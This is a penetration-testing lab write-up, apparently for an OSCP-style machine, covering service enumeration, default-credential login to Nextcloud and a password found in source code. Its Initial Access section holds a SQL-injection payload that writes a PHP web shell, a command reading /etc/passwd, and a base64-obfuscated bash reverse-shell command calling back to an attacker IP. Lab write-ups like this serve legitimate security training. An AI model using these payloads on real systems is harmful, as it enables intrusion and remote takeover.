# System Information
OS: Linux
IP: 192.168.183.147

---
# Service Enumeration

## 22/tcp SSH
OpenSSH 8.4

## 17445/tcp HTTP

![[Pasted image 20260829145215.png]]

Small ticketing system. Seems to be homegrown, not a known service. Registered new account as admin:admin, no interesting findings.

## 30455/tcp HTTP

![[Pasted image 20260829145428.png]]

Another homegrown page, from what I can tell.

http://192.168.183.147:30455/phpinfo.php exposed. Document root: /srv/http

No other leads or interesting findings

## 50080/tcp HTTP

Apache/2.4.46 (Unix) PHP/7.4.15

![[Pasted image 20260829145652.png]]

Feroxbuster finds http://192.168.183.147:50080/cloud/index.php/login, a Nextcloud login page:

![[Pasted image 20260829145828.png]]

Guess:
- admin:admin (Valid credentials)

Change language to English

![[Pasted image 20260829150223.png]]

![[Pasted image 20260829150250.png]]

Download issuetracker.zip, extract contents, `rg 'pass'`, find:

```
src/main/resources/application.properties
3:spring.datasource.password=ManagementInsideOld797
```

http://192.168.183.147:50080/cloud/index.php/settings/admin/overview

Nextcloud version Nextcloud 20.0.7

No more interesting findings with Nextcloud itself.

# Initial Access

Taking another look at the source code downloaded for the issue tracker application, we'll find that it's likely vulnerable to SQLi on `/issue/CheckByPriority`, as the user-provided "priority" parameter is injected directly into the raw SQL query.

![[Pasted image 20260829151459.png]]

Make a post request with the following data:

`priority=High' union select '<?php system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/webshell.php' -- -`

![[Pasted image 20260829152100.png]]


```
curl $IP:30455/webshell.php -G --data-urlencode 'cmd=cat /etc/passwd'
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
daemon:x:2:2::/:/usr/bin/nologin
mail:x:8:12::/var/spool/mail:/usr/bin/nologin
ftp:x:14:11::/srv/ftp:/usr/bin/nologin
http:x:33:33::/srv/http:/usr/bin/nologin
nobody:x:65534:65534:Nobody:/:/usr/bin/nologin
dbus:x:81:81:System Message Bus:/:/usr/bin/nologin
systemd-journal-remote:x:982:982:systemd Journal Remote:/:/usr/bin/nologin
systemd-network:x:981:981:systemd Network Management:/:/usr/bin/nologin
systemd-resolve:x:980:980:systemd Resolver:/:/usr/bin/nologin
systemd-timesync:x:979:979:systemd Time Synchronization:/:/usr/bin/nologin
systemd-coredump:x:978:978:systemd Core Dumper:/:/usr/bin/nologin
uuidd:x:68:68::/:/usr/bin/nologin
dhcpcd:x:977:977:dhcpcd privilege separation:/:/usr/bin/nologin
clinton:x:1000:1000::/home/clinton:/bin/bash
mysql:x:976:976:MariaDB:/var/lib/mysql:/usr/bin/nologin
```

Establish reverse shell:

`curl $IP:30455/webshell.php -G --data-urlencode 'cmd=printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xOTQvNDQzIDA+JjEpICY=|base64 -d|bash'`

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20260829152324.png]]